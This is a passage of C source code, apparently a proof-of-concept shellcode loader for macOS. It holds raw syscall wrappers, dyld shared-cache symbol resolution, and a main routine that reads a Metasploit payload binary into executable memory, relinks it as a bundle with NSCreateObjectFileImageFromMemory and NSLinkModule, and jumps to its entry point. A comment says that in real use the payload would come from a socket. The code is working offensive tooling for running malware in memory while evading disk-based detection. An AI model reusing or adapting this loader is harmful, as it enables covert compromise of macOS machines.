    static return_t scc_readlinkat(int fd, user_addr_t path, user_addr_t buf, size_t bufsize) ;
    static return_t scc_symlinkat(user_addr_t *path1, int fd, user_addr_t path2) ;
    static return_t scc_mkdirat(int fd, user_addr_t path, int mode) ;
    static return_t scc_getattrlistat(int fd, const char *path, struct attrlist *alist, void *attributeBuffer, size_t bufferSize, u_long options) ;
    static return_t scc_proc_trace_log(pid_t pid, uint64_t uniqueid) ;
    static return_t scc_bsdthread_ctl(user_addr_t cmd, user_addr_t arg1, user_addr_t arg2, user_addr_t arg3) ;
    static return_t scc_openbyid_np(user_addr_t fsid, user_addr_t objid, int oflags) ;
    static return_t scc_recvmsg_x(int s, struct msghdr_x *msgp, u_int cnt, int flags) ;
    static return_t scc_sendmsg_x(int s, struct msghdr_x *msgp, u_int cnt, int flags) ;
    static return_t scc_thread_selfusage(void) ;
    static return_t scc_guarded_open_dprotected_np(const char *path, const guardid_t *guard, u_int guardflags, int flags, int dpclass, int dpflags, int mode) ;
    static return_t scc_guarded_write_np(int fd, const guardid_t *guard, user_addr_t cbuf, user_size_t nbyte) ;
    static return_t scc_guarded_pwrite_np(int fd, const guardid_t *guard, user_addr_t buf, user_size_t nbyte, off_t offset) ;
    static return_t scc_guarded_writev_np(int fd, const guardid_t *guard, struct iovec *iovp, u_int iovcnt) ;

// End syscalls

#ifdef __arm64

#define ASM_BREAKPOINT __asm__("BRK #3");
#define REG_ARG1 "x0"
#define REG_SYSNUM "x16"
#define REG_SYSRET "x0"

#define DECL_ARG(name, reg)      register uint64_t name asm(reg)
#define COPY_ARG(dest, src, reg) DECL_ARG(dest, reg) = src

#define COPY_SYSNUM(dest, src) COPY_ARG(dest, src, REG_SYSNUM)
#define COPY_ARG1(dest, src)   COPY_ARG(dest, src, "x0")
#define COPY_ARG2(dest, src)   COPY_ARG(dest, src, "x1")
#define COPY_ARG3(dest, src)   COPY_ARG(dest, src, "x2")
#define COPY_ARG4(dest, src)   COPY_ARG(dest, src, "x3")
#define COPY_ARG5(dest, src)   COPY_ARG(dest, src, "x4")
#define COPY_ARG6(dest, src)   COPY_ARG(dest, src, "x5")
#define COPY_ARG7(dest, src)   COPY_ARG(dest, src, "x6")
#define COPY_ARG8(dest, src)   COPY_ARG(dest, src, "x7")

#define SCRATCH_REGS "x16", "x17"

#define SYS_CALL_ASM \
		"svc 0x80;\n" \
		"neg x1, x0;\n" \
		"csel x0, x0, x1, cc;\n" 

#elif __x86_64

#define ASM_BREAKPOINT __asm__("int3");
// set up parameters and calls for __x86_64

#define REG_ARG1 "rdi"
#define REG_SYSNUM "rax"
#define REG_SYSRET "rax"

#define DECL_ARG(name, reg)      register uint64_t name asm(reg)
#define COPY_ARG(dest, src, reg) DECL_ARG(dest, reg) = src

#define COPY_SYSNUM(dest, src) COPY_ARG(dest, src, REG_SYSNUM)
#define COPY_ARG1(dest, src)   COPY_ARG(dest, src, "rdi")
#define COPY_ARG2(dest, src)   COPY_ARG(dest, src, "rsi")
#define COPY_ARG3(dest, src)   COPY_ARG(dest, src, "rdx")
#define COPY_ARG4(dest, src)   COPY_ARG(dest, src, "r10")
#define COPY_ARG5(dest, src)   COPY_ARG(dest, src, "r8")
#define COPY_ARG6(dest, src)   COPY_ARG(dest, src, "r9")

// These are not used by the kernel, we include them to get the 
//   functions to compile.
#define COPY_ARG7(dest, src)   COPY_ARG(dest, src, "rcx")
#define COPY_ARG8(dest, src)   COPY_ARG(dest, src, "r11")

/*#define SCRATCH_REGS "rax", "rdi", "rsi", "rdx", "rcx", "r8", "r9", "r10", "r11"*/
#define SCRATCH_REGS 

// .bytes are jnb +3
#define SYS_CALL_ASM \
		"syscall;\n"  \
		".byte 0x73; .byte 0x03;\n" \
		"negq %%rax;\n" 


#elif
#error "Unsupported architecture"
#endif

static uint64_t scc_syscall0(uint64_t num) {
	COPY_SYSNUM(_num, num);
	DECL_ARG(_arg1, REG_ARG1);

	DECL_ARG(_ret, REG_SYSRET);

	asm volatile (
		SYS_CALL_ASM
		:"=r"(_ret)
		:"r"(_arg1), "r"(_num)
		:SCRATCH_REGS);

	return _ret;
}

static uint64_t scc_syscall1(uint64_t arg1, 
						 uint64_t num) {
	COPY_SYSNUM(_num, num);
	COPY_ARG1(_arg1, arg1);

	DECL_ARG(_ret, REG_SYSRET);

    asm volatile (
		SYS_CALL_ASM
		:"=r"(_ret)
		:"r"(_arg1), "r"(_num)
		:SCRATCH_REGS);

	return _ret;
}

static uint64_t scc_syscall2(uint64_t arg1, uint64_t arg2, uint64_t num) {
	COPY_SYSNUM(_num, num);
	COPY_ARG1(_arg1, arg1);
	COPY_ARG2(_arg2, arg2);

	DECL_ARG(_ret, REG_SYSRET);

	asm volatile (
		SYS_CALL_ASM
		:"=r"(_ret)
		:"r"(_arg1), "r"(_arg2),"r"(_num)
		:SCRATCH_REGS);

	return _ret;
}

static uint64_t scc_syscall3(uint64_t arg1, uint64_t arg2, uint64_t arg3, 
						 uint64_t num) {
	COPY_SYSNUM(_num, num);
	COPY_ARG1(_arg1, arg1);
	COPY_ARG2(_arg2, arg2);
	COPY_ARG3(_arg3, arg3);

	DECL_ARG(_ret, REG_SYSRET);

	asm volatile (
		SYS_CALL_ASM
		:"=r"(_ret)
		:"r"(_arg1), "r"(_arg2),"r"(_arg3),"r"(_num)
		:SCRATCH_REGS);

	return _ret;
}

static uint64_t scc_syscall4(uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4, 
						 uint64_t num) {
	COPY_SYSNUM(_num, num);
	COPY_ARG1(_arg1, arg1);
	COPY_ARG2(_arg2, arg2);
	COPY_ARG3(_arg3, arg3);
	COPY_ARG4(_arg4, arg4);

	DECL_ARG(_ret, REG_SYSRET);

	asm volatile (
		SYS_CALL_ASM
		:"=r"(_ret)
		:"r"(_arg1), "r"(_arg2),"r"(_arg3),"r"(_arg4),"r"(_num)
		:SCRATCH_REGS);

	return _ret;
}

static uint64_t scc_syscall5(uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4,
	                         uint64_t arg5, uint64_t num) {
	COPY_SYSNUM(_num, num);
	COPY_ARG1(_arg1, arg1);
	COPY_ARG2(_arg2, arg2);
	COPY_ARG3(_arg3, arg3);
	COPY_ARG4(_arg4, arg4);
	COPY_ARG5(_arg5, arg5);

	DECL_ARG(_ret, REG_SYSRET);

	asm volatile (
		SYS_CALL_ASM
		:"=r"(_ret)
		:"r"(_arg1), "r"(_arg2),"r"(_arg3),"r"(_arg4),"r"(_arg5),"r"(_num)
		:SCRATCH_REGS);

	return _ret;
}

static uint64_t scc_syscall6(uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4,
	                         uint64_t arg5, uint64_t arg6, uint64_t num) {
	COPY_SYSNUM(_num, num);
	COPY_ARG1(_arg1, arg1);
	COPY_ARG2(_arg2, arg2);
	COPY_ARG3(_arg3, arg3);
	COPY_ARG4(_arg4, arg4);
	COPY_ARG5(_arg5, arg5);
	COPY_ARG6(_arg6, arg6);

	DECL_ARG(_ret, REG_SYSRET);

	asm volatile (
		SYS_CALL_ASM
		:"=r"(_ret)
		:"r"(_arg1), "r"(_arg2),"r"(_arg3),"r"(_arg4),"r"(_arg5),"r"(_arg6),"r"(_num)
		:SCRATCH_REGS);

	return _ret;
}

static uint64_t scc_syscall7(uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4,
	                         uint64_t arg5, uint64_t arg6, uint64_t arg7, uint64_t num) {
	COPY_SYSNUM(_num, num);
	COPY_ARG1(_arg1, arg1);
	COPY_ARG2(_arg2, arg2);
	COPY_ARG3(_arg3, arg3);
	COPY_ARG4(_arg4, arg4);
	COPY_ARG5(_arg5, arg5);
	COPY_ARG6(_arg6, arg6);
	COPY_ARG7(_arg7, arg7);

	DECL_ARG(_ret, REG_SYSRET);

	asm volatile (
		SYS_CALL_ASM
		:"=r"(_ret)
		:"r"(_arg1), "r"(_arg2),"r"(_arg3),"r"(_arg4),"r"(_arg5),"r"(_arg6),"r"(_arg7),"r"(_num)
		:SCRATCH_REGS);

	return _ret;
}

static uint64_t scc_syscall8(uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4,
	                         uint64_t arg5, uint64_t arg6, uint64_t arg7, uint64_t arg8,uint64_t num) {
	COPY_SYSNUM(_num, num);
	COPY_ARG1(_arg1, arg1);
	COPY_ARG2(_arg2, arg2);
	COPY_ARG3(_arg3, arg3);
	COPY_ARG4(_arg4, arg4);
	COPY_ARG5(_arg5, arg5);
	COPY_ARG6(_arg6, arg6);
	COPY_ARG7(_arg7, arg7);
	COPY_ARG8(_arg8, arg8);

	DECL_ARG(_ret, REG_SYSRET);

	asm volatile (
		SYS_CALL_ASM
		:"=r"(_ret)
		:"r"(_arg1), "r"(_arg2),"r"(_arg3),"r"(_arg4),"r"(_arg5),"r"(_arg6),"r"(_arg7),"r"(_arg8),"r"(_num)
		:SCRATCH_REGS);

	return _ret;
}

static uint64_t scc_syscall0(uint64_t num) ;
static uint64_t scc_syscall1(uint64_t arg1, uint64_t num) ;
static uint64_t scc_syscall2(uint64_t arg1, uint64_t arg2, uint64_t num);
static uint64_t scc_syscall3(uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t num) ;
static uint64_t scc_syscall4(uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4, uint64_t num) ;
static uint64_t scc_syscall5(uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4,
	                         uint64_t arg5, uint64_t num) ;
static uint64_t scc_syscall6(uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4,
	                         uint64_t arg5, uint64_t arg6, uint64_t num) ;
static uint64_t scc_syscall7(uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4,
	                         uint64_t arg5, uint64_t arg6, uint64_t arg7, uint64_t num) ;
static uint64_t scc_syscall8(uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4,
	                         uint64_t arg5, uint64_t arg6, uint64_t arg7, uint64_t arg8, uint64_t num) ;


#define PRE_CONDITION(reg, var) __asm__("mov %0, " reg : "=r"(var))


#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

struct dyld_cache_header
{
    char        magic[16];        // e.g. "dyld_v0     ppc"
    uint32_t    mappingOffset;    // file offset to first shared_file_mapping
    uint32_t    mappingCount;     // number of shared_file_mapping entries
    uint32_t    imagesOffset;     // file offset to first dyld_cache_image_info
    uint32_t    imagesCount;      // number of dyld_cache_image_info entries
    uint64_t    dyldBaseAddress;  // base address of dyld when cache was built
		uint64_t    codeSignatureOffset;
		uint64_t    codeSignatureSize;
		uint64_t    slideInfoOffset;
		uint64_t    slideInfoSize;
		uint64_t    localSymbolsOffset;
		uint64_t    localSymbolsSize;
		char        uuid[16];
};

struct shared_file_mapping {
    uint64_t       address;
    uint64_t       size;
    uint64_t       file_offset;
    uint32_t       max_prot;
    uint32_t       init_prot;
};

struct dyld_cache_image_info
{
    uint64_t    address;
    uint64_t    modTime;
    uint64_t    inode;
    uint32_t    pathFileOffset;
    uint32_t    pad;
};

void * get_dlsym_addr();
typedef void* (*dlsym_ptr)(void *handle, const char *symbol);
typedef void* (*dlopen_ptr)(const char *filename, int flag);
typedef int (*printf_ptr)(const char * format, ...);
typedef void (*AudioServicesPlayAlertSound_ptr)(uint32_t inSystemSoundID);
typedef NSObjectFileImageReturnCode (*NSCreateObjectFileImageFromMemory_ptr)(void *address, unsigned long size, NSObjectFileImage *objectFileImage);
typedef NSModule (*NSLinkModule_ptr)(NSObjectFileImage objectFileImage, const char* moduleName, unsigned long options);
int load_from_disk(char *filename, char **buf, unsigned int *size);
int find_epc(unsigned long base, struct entry_point_command **entry);
int find_macho(unsigned long addr, unsigned long *base, unsigned int increment, unsigned int dereference);
unsigned long resolve_symbol(unsigned long base, char* symbol);

#define EXECUTABLE_BASE_ADDR 0x100000000
#define DYLD_BASE 0x00007fff5fc00000

int main(int argc, char **argv, char **envp, char **apple)
{
  long write = 0x2000004; /* syscall "write" on MacOS X */
  long stdout = 1;
  char * str = "Hello World\n";
  unsigned long len = 12;
  unsigned long ret = 0;
  /* ret = write(stdout, str, len); */
  __asm__("movq %1, %%rax;\n"
          "movq %2, %%rdi;\n"
          "movq %3, %%rsi;\n"
          "movq %4, %%rdx;\n"
          "syscall;\n"
          "movq %%rax, %0;\n"
          : "=g"(ret)
          : "g"(write), "g"(stdout), "g"(str), "g"(len)
          : ); /* assign from generic registers to syscall registers */
  printf_ptr printf_func = 0;
  /*printf_ptr printf_func = printf;*/
  /*printf_func("Hello world! %d,%d\n", SIGPIPE, SIG_IGN);*/

  void * dlsym_addr = get_dlsym_addr();
  dlsym_ptr dlsym_func = dlsym_addr;

  /*printf_func("dyld world! %p\n", dlsym_func(RTLD_DEFAULT, "printf");*/
  uint64_t binary = 0;
  uint64_t dyld = 0;

  if(find_macho(EXECUTABLE_BASE_ADDR, &binary, 0x1000, 0)) return 1;
  if(find_macho(binary + 0x1000, &dyld, 0x1000, 0)) return 1;

  printf_func("dyld world! %p\n", dyld);

  /*dlsym_func = resolve_symbol(dyld, 25, 0x4d6d6f72);*/

  /*dlopen_ptr dlopen_func = dlsym_func(RTLD_DEFAULT, "dlopen");*/
  /*printf_func("dlopen! %p\n", dlopen_func);*/

  /*printf_func("dlopen %p!\n", dlopen_func);*/
  /*void * handle = dlopen_func("/System/Library/Frameworks/AudioToolbox.framework/AudioToolbox", RTLD_NOW);*/
  /*printf_func("Audio %p!\n", handle);*/
  /*AudioServicesPlayAlertSound_ptr AudioServicesPlayAlertSound_func = dlsym_func(handle, "AudioServicesPlayAlertSound");*/
  /*printf_func("Audio %p!\n", AudioServicesPlayAlertSound_func);*/
  /*AudioServicesPlayAlertSound_func(0x00000FFF);*/
  /*AudioServicesPlayAlertSound_func(0x000003ea);*/

  /*NSCreateObjectFileImageFromMemory_ptr NSCreateObjectFileImageFromMemory_func = dlsym_func(RTLD_DEFAULT, "NSCreateObjectFileImageFromMemory");*/
  NSCreateObjectFileImageFromMemory_ptr NSCreateObjectFileImageFromMemory_func = resolve_symbol(dyld, "_NSCreateObjectFileImageFromMemory");
  printf_func("image %p!\n", NSCreateObjectFileImageFromMemory_func);

  /*NSLinkModule_ptr NSLinkModule_func = dlsym_func(RTLD_DEFAULT, "NSLinkModule");*/
  NSLinkModule_ptr NSLinkModule_func = resolve_symbol(dyld, "_NSLinkModule");
  printf_func("link %p!\n", NSLinkModule_func);

	// Load the binary specified by filename using dyld
	char *binbuf = NULL;
	unsigned int size;

  if(load_from_disk("/Users/user/dev/git/metasploit-framework/met", &binbuf, &size)) {
    printf_func("load failed!\n");
    return 1;
  }
	// change the filetype to a bundle
	int type = ((int *)binbuf)[3];
	if(type != 0x8) ((int *)binbuf)[3] = 0x8; //change to mh_bundle type

	// create file image
	NSObjectFileImage fi; 
	if(NSCreateObjectFileImageFromMemory_func(binbuf, size, &fi) != 1) {
    printf_func("image failed!\n");
    return 1;
	}

	// link image
	NSModule nm = NSLinkModule_func(fi, "mytest", NSLINKMODULE_OPTION_PRIVATE | NSLINKMODULE_OPTION_BINDNOW);
	if(!nm) {
    printf_func("link failed!\n");
    return 1;
	}
  /*printf_func("type %d!\n", type);*/

	/*// find entry point and call it*/
  if(type == 0x2) { //mh_execute
    unsigned long execute_base;
    struct entry_point_command *epc;

    /*printf_func("nm %p!\n", *(uint32_t*)nm);*/

    if(find_macho((unsigned long)nm, &execute_base, sizeof(int), 1)) {
    printf_func("find failed!\n");
      return 3;
    }

    if(find_epc(execute_base, &epc)) {
    printf_func("epc failed!\n");
      return 4;
    }

    int(*main_func)(int, char**, char**, char**) = (int(*)(int, char**, char**, char**))(execute_base + epc->entryoff);
    char *argv[]={"test", NULL};
    int argc = 1;
    char *env[] = {NULL};
    char *apple[] = {NULL};
    return main_func(argc, argv, env, apple);
  }

  return 0;
}

unsigned long resolve_symbol(unsigned long base, char* symbol) {
	// Parse the symbols in the Mach-O image at base and return the address of the one
	// matched by the offset / int pair (offset, match)
	struct load_command *lc;
	struct segment_command_64 *sc, *linkedit, *text;
	struct symtab_command *symtab;
	struct nlist_64 *nl;

	char *strtab;

	symtab = 0;
	linkedit = 0;
	text = 0;

	lc = (struct load_command *)(base + sizeof(struct mach_header_64));
	for(int i=0; i<((struct mach_header_64 *)base)->ncmds; i++) {
		if(lc->cmd == 0x2/*LC_SYMTAB*/) {
			symtab = (struct symtab_command *)lc;
		} else if(lc->cmd == 0x19/*LC_SEGMENT_64*/) {
			sc = (struct segment_command_64 *)lc;
			switch(*((unsigned int *)&((struct segment_command_64 *)lc)->segname[2])) { //skip __
			case 0x4b4e494c:	//LINK
				linkedit = sc;
				break;
			case 0x54584554:	//TEXT
				text = sc;
				break;
			}
		}
		lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
	}

	if(!linkedit || !symtab || !text) return -1;

	unsigned long file_slide = linkedit->vmaddr - text->vmaddr - linkedit->fileoff;
	strtab = (char *)(base + file_slide + symtab->stroff);

	nl = (struct nlist_64 *)(base + file_slide + symtab->symoff);
	for(int i=0; i<symtab->nsyms; i++) {
		char *name = strtab + nl[i].n_un.n_strx;
    /*printf("sym %s\n", name);*/
    if (string_compare(name, symbol) == 0) {
		/*if(*(unsigned int *)&name[offset] == match) {*/
      return base + nl[i].n_value;
			/*if(is_sierra()) {*/
				/*return base + nl[i].n_value;*/
			/*} else {*/
				/*return base - DYLD_BASE + nl[i].n_value;*/
			/*}*/
		}
	}

	return -1;
}

int find_macho(unsigned long addr, unsigned long *base, unsigned int increment, unsigned int dereference) {
	unsigned long ptr;

	// find a Mach-O header by searching from address.
	*base = 0;
		
	while(1) {
		ptr = addr;
		if(dereference) ptr = *(unsigned long *)ptr;
		chmod((char *)ptr, 0777);
		if(errno == 2 /*ENOENT*/ &&
			((int *)ptr)[0] == 0xfeedfacf /*MH_MAGIC_64*/) {
			*base = ptr;
			return 0;
		}

		addr += increment;
	}
	return 1;
}

int find_epc(unsigned long base, struct entry_point_command **entry) {
	// find the entry point command by searching through base's load commands

	struct mach_header_64 *mh;
	struct load_command *lc;

	unsigned long text = 0;

	*entry = NULL;

	mh = (struct mach_header_64 *)base;
	lc = (struct load_command *)(base + sizeof(struct mach_header_64));
	for(int i=0; i<mh->ncmds; i++) {
		if(lc->cmd == LC_MAIN) {	//0x80000028
			*entry = (struct entry_point_command *)lc;
			return 0;
		}

		lc = (struct load_command *)((unsigned long)lc + lc->cmdsize);
	}

	return 1;
}
int load_from_disk(char *filename, char **buf, unsigned int *size) {
	/*
	 What, you say?  this isn't running from memory!  You're loading from disk!!
	 Put down the pitchforks, please.  Yes, this reads a binary from disk...into 
	 memory.  The code is then executed from memory.  This here is a POC; in
	 real life you would probably want to read into buf from a socket. 
	 */
	int fd;
	struct stat s;

	if((fd = open(filename, O_RDONLY)) == -1) return 1;
	if(fstat(fd, &s)) return 1;
	
	*size = s.st_size;

	if((*buf = mmap(NULL, (*size) * sizeof(char), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON, -1, 0)) == MAP_FAILED) return 1;
	if(read(fd, *buf, *size * sizeof(char)) != *size) {
		free(*buf);
		*buf = NULL;
		return 1;
	}

	close(fd);

	return 0;
}
int string_compare(const char* s1, const char* s2) {
  while (*s1 != '\0' && *s1 == *s2)
  {
    s1++;
    s2++;
  }
  return (*(unsigned char *) s1) - (*(unsigned char *) s2);
}

void hex(char* data2, size_t data_length) {
  char const hex_chars[16] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F' };
  char data[8] = "abcd";
  char output[4] = "";
  for( int i = 0; i < data_length; i++ )
  {
    char const byte = data[i];
    /*output[0] = byte;*/
    /*output[1] = '\n';*/
    /*output[2] = '\n';*/
    /*scc_write(STDOUT_FILENO, output, 2);*/
    /*output[0] = hex_chars[ 0 ];*/
    /*output[1] = hex_chars[ 1 ];*/
    /*output[2] = '\n';*/
    /*scc_write(STDOUT_FILENO, output, 3);*/
    /*output[0] = 'a' + (( byte & 0xF0 ) >> 4);*/
    /*output[1] = 'a' + (( byte & 0x0F ) >> 0);*/
    /*output[2] = '\n';*/
    /*scc_write(STDOUT_FILENO, output, 3);*/
    output[0] = hex_chars[ ( byte & 0xF0 ) >> 4 ];
    output[1] = hex_chars[ ( byte & 0x0F ) >> 0 ];
    scc_write(STDOUT_FILENO, output, 2);
  }
  scc_write(STDOUT_FILENO, "\n", 1);
}

void * get_dlsym_addr() 
{
  uint64_t shared_region_start = 0;
  /*uint64_t shared_region_start = 0x00007fff5fc00000;*/
  /*void* shared_region_start;*/
  scc_shared_region_check_np(&shared_region_start);
  /*shared_region_check_np();*/

      /*char output[1000] = "a\n";*/
    struct dyld_cache_header *header = (void*)shared_region_start;
    struct shared_file_mapping *sfm = (void*)header + header->mappingOffset;
		void* vm_slide_offset  = (void*)header - sfm->address;
    struct dyld_cache_image_info *dcimg = (void*)header + header->imagesOffset;
    void * libdyld_address;
    size_t count = header->imagesCount;
    for (size_t i=0; i < count; i++) {
      uint32_t offset = dcimg->pathFileOffset;
      if (!offset) {
        dcimg++;
        continue;
      }
        /*printf("%p\n", offset);*/
      /*scc_write(STDOUT_FILENO, "a", 1);*/
			char * pathFile = (char*)header + offset;
      /*scc_write(STDOUT_FILENO, pathFile, strlen(pathFile));*/
      /*int i=0;*/
      /*while(i < 2){*/
        /*output[i] = pathFile[i];*/
        /*if (pathFile[i] == 0) {*/
          /*break;*/
        /*}*/
        /*i++;*/
      /*}*/
      /*scc_write(STDOUT_FILENO, pathFile, strlen(pathFile));*/
      if (string_compare(pathFile, "/usr/lib/system/libdyld.dylib") == 0) {
        libdyld_address = (dcimg->address + vm_slide_offset);
        break;
      }
			dcimg++;
    }

    //NSLog(@"line %d libdyld_address %p %p", __LINE__, libdyld_address, *(uint32_t*)libdyld_address);

		struct mach_header_64 *mh = (struct mach_header_64*)libdyld_address;
  /*scc_shared_region_check_np((&mh) + 1); // 294*/
		const struct load_command* cmd = (struct load_command*)(((char*)mh)+sizeof(struct mach_header_64));
		struct symtab_command* symtab_cmd = 0;
		struct segment_command_64* linkedit_cmd = 0;
		struct segment_command_64* text_cmd = 0;

		for (uint32_t i = 0; i < mh->ncmds; ++i) {
			//NSLog(@"line %d load %p %p", __LINE__, cmd->cmd, cmd);
  /*scc_shared_region_check_np((&shared_region_start) + 1); // 294*/
  /*scc_shared_region_check_np((void*)mh->ncmds); // 294*/
  /*scc_shared_region_check_np((&cmd) + 1); // 294*/
			if (cmd->cmd == LC_SEGMENT_64) {
					struct segment_command_64* segment_cmd = (struct segment_command_64*)cmd;
					if (string_compare(segment_cmd->segname, SEG_TEXT) == 0) {
						text_cmd = segment_cmd;
						//NSLog(@"text_segment :%p %s %p %p %p %p:\n", segment_cmd, segment_cmd->segname, segment_cmd->vmaddr, segment_cmd->fileoff, segment_cmd->nsects, segment_cmd->cmd);
					} else if (string_compare(segment_cmd->segname, SEG_LINKEDIT) == 0) {
						linkedit_cmd = segment_cmd;
						//NSLog(@"linkedit :%p %p vmaddr %p fileoff %p:\n", linkedit_cmd, segment_cmd->segname, linkedit_cmd->vmaddr, linkedit_cmd->fileoff);
					}
			}
			if (cmd->cmd == LC_SYMTAB) {
				symtab_cmd = (struct symtab_command*)cmd;
				//NSLog(@"symtab :%p %d %p %p %p:\n", symtab_cmd, symtab_cmd->nsyms, symtab_cmd->symoff, symtab_cmd->stroff, symtab_cmd->strsize);
			}
			cmd = (const struct load_command*)(((char*)cmd)+cmd->cmdsize);
  /*scc_shared_region_check_np(&shared_region_start); // 294*/
		}
		//NSLog(@"main %p, dlopen %p, dlsym %p", main, dlopen, dlsym);

		unsigned int file_slide = ((unsigned long)linkedit_cmd->vmaddr - (unsigned long)text_cmd->vmaddr) - linkedit_cmd->fileoff;
		struct nlist_64 *sym = (struct nlist_64*)((unsigned long)mh + (symtab_cmd->symoff + file_slide));
		char *strings = (char*)((unsigned long)mh + (symtab_cmd->stroff + file_slide));

		for (uint32_t i = 0; i < symtab_cmd->nsyms; ++i) {
			if (sym->n_un.n_strx)
			{
				char * symbol = strings + sym->n_un.n_strx;
				if (string_compare(symbol, "_dlsym") == 0) {
					/*NSLog(@"symbol :%s %p:\n", symbol, sym->n_value);*/
					return sym->n_value + vm_slide_offset;
				}
			}
      sym += 1;
		}
		return 0;
}


static return_t scc_nosys(void) {
  return scc_syscall0(POSIX_CALL_NUM(0));
}


static void scc_exit(int rval) {
  scc_syscall1((uint64_t)rval, POSIX_CALL_NUM(1));
  __builtin_unreachable ();
}


static return_t scc_fork(void) {
  return scc_syscall0(POSIX_CALL_NUM(2));
}


static return_t scc_read(int fd, char* cbuf, user_size_t nbyte) {
  return scc_syscall3((uint64_t)fd, (uint64_t)cbuf, (uint64_t)nbyte, POSIX_CALL_NUM(3));
}


static return_t scc_write(int fd, char* cbuf, user_size_t nbyte) {
  return scc_syscall3((uint64_t)fd, (uint64_t)cbuf, (uint64_t)nbyte, POSIX_CALL_NUM(4));
}


static return_t scc_open(char* path, int flags, int mode) {
  return scc_syscall3((uint64_t)path, (uint64_t)flags, (uint64_t)mode, POSIX_CALL_NUM(5));
}


static return_t scc_close(int fd) {
  return scc_syscall1((uint64_t)fd, POSIX_CALL_NUM(6));
}


static return_t scc_wait4(int pid, user_addr_t status, int options, user_addr_t rusage) {
  return scc_syscall4((uint64_t)pid, (uint64_t)status, (uint64_t)options, (uint64_t)rusage, POSIX_CALL_NUM(7));
}


static return_t scc_link(char* path, user_addr_t link) {
  return scc_syscall2((uint64_t)path, (uint64_t)link, POSIX_CALL_NUM(9));
}


static return_t scc_unlink(char* path) {
  return scc_syscall1((uint64_t)path, POSIX_CALL_NUM(10));
}


static return_t scc_chdir(char* path) {
  return scc_syscall1((uint64_t)path, POSIX_CALL_NUM(12));
}


static return_t scc_fchdir(int fd) {
  return scc_syscall1((uint64_t)fd, POSIX_CALL_NUM(13));
}


static return_t scc_mknod(char* path, int mode, int dev) {
  return scc_syscall3((uint64_t)path, (uint64_t)mode, (uint64_t)dev, POSIX_CALL_NUM(14));
}


static return_t scc_chmod(char* path, int mode) {
  return scc_syscall2((uint64_t)path, (uint64_t)mode, POSIX_CALL_NUM(15));
}


static return_t scc_chown(char* path, int uid, int gid) {
  return scc_syscall3((uint64_t)path, (uint64_t)uid, (uint64_t)gid, POSIX_CALL_NUM(16));
}


static return_t scc_getfsstat(char* buf, int bufsize, int flags) {
  return scc_syscall3((uint64_t)buf, (uint64_t)bufsize, (uint64_t)flags, POSIX_CALL_NUM(18));
}


static return_t scc_getpid(void) {
  return scc_syscall0(POSIX_CALL_NUM(20));
}


static return_t scc_setuid(uid_t uid) {
  return scc_syscall1((uint64_t)uid, POSIX_CALL_NUM(23));
}


static return_t scc_getuid(void) {
  return scc_syscall0(POSIX_CALL_NUM(24));
}


static return_t scc_geteuid(void) {
  return scc_syscall0(POSIX_CALL_NUM(25));
}


static return_t scc_ptrace(int req, pid_t pid, caddr_t addr, int data) {
  return scc_syscall4((uint64_t)req, (uint64_t)pid, (uint64_t)addr, (uint64_t)data, POSIX_CALL_NUM(26));
}


static return_t scc_recvmsg(int s, struct msghdr *msg, int flags) {
  return scc_syscall3((uint64_t)s, (uint64_t)msg, (uint64_t)flags, POSIX_CALL_NUM(27));
}


static return_t scc_sendmsg(int s, caddr_t msg, int flags) {
  return scc_syscall3((uint64_t)s, (uint64_t)msg, (uint64_t)flags, POSIX_CALL_NUM(28));
}


static return_t scc_recvfrom(int s, void *buf, size_t len, int flags, struct sockaddr *from, int *fromlenaddr) {
  return scc_syscall6((uint64_t)s, (uint64_t)buf, (uint64_t)len, (uint64_t)flags, (uint64_t)from, (uint64_t)fromlenaddr, POSIX_CALL_NUM(29));
}


static return_t scc_accept(int s, caddr_t name, socklen_t *anamelen) {
  return scc_syscall3((uint64_t)s, (uint64_t)name, (uint64_t)anamelen, POSIX_CALL_NUM(30));
}


static return_t scc_getpeername(int fdes, caddr_t asa, socklen_t *alen) {
  return scc_syscall3((uint64_t)fdes, (uint64_t)asa, (uint64_t)alen, POSIX_CALL_NUM(31));
}


static return_t scc_getsockname(int fdes, caddr_t asa, socklen_t *alen) {
  return scc_syscall3((uint64_t)fdes, (uint64_t)asa, (uint64_t)alen, POSIX_CALL_NUM(32));
}


static return_t scc_access(char* path, int flags) {
  return scc_syscall2((uint64_t)path, (uint64_t)flags, POSIX_CALL_NUM(33));
}


static return_t scc_chflags(char *path, int flags) {
  return scc_syscall2((uint64_t)path, (uint64_t)flags, POSIX_CALL_NUM(34));
}


static return_t scc_fchflags(int fd, int flags) {
  return scc_syscall2((uint64_t)fd, (uint64_t)flags, POSIX_CALL_NUM(35));
}


static return_t scc_sync(void) {
  return scc_syscall0(POSIX_CALL_NUM(36));
}


static return_t scc_kill(int pid, int signum, int posix) {
  return scc_syscall3((uint64_t)pid, (uint64_t)signum, (uint64_t)posix, POSIX_CALL_NUM(37));
}


static return_t scc_getppid(void) {
  return scc_syscall0(POSIX_CALL_NUM(39));
}

static return_t scc_dup(u_int fd) {
  return scc_syscall1((uint64_t)fd, POSIX_CALL_NUM(41));
}


static return_t scc_pipe(void) {
  return scc_syscall0(POSIX_CALL_NUM(42));
}


static return_t scc_getegid(void) {
  return scc_syscall0(POSIX_CALL_NUM(43));
}


static return_t scc_sigaction(int signum, struct __sigaction *nsa, struct sigaction *osa) {
  return scc_syscall3((uint64_t)signum, (uint64_t)nsa, (uint64_t)osa, POSIX_CALL_NUM(46));
}


static return_t scc_getgid(void) {
  return scc_syscall0(POSIX_CALL_NUM(47));
